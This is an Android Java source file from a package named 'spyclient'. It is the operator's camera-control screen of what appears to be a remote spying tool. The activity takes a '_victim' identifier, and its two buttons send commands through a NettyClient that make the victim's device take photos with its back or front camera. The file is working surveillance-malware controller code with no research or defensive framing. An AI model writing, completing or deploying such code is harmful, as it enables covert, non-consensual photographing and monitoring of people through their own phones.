package slade.carter.spyclient;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import org.json.simple.JSONArray;

public class CameraManagerActivity extends AppCompatActivity {

    private static CameraManagerActivity _instance;
    private String _victim;
    private Button _backPictureButton;
    private Button _frontPictureButton;

    public static CameraManagerActivity getInstance() {
        return _instance;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_camera_manager);
        _instance = this;
        _victim = getIntent().getStringExtra("victim");
        _backPictureButton = (Button) findViewById(R.id.backPictureButton);
        _frontPictureButton = (Button) findViewById(R.id.frontPictureButton);

        initListeners();
    }

    private void initListeners() {
        _backPictureButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                NettyClient.getInstance().sendTakePicture(0, _victim);
            }
        });

        _frontPictureButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                NettyClient.getInstance().sendTakePicture(1, _victim);
            }
        });

    }

}
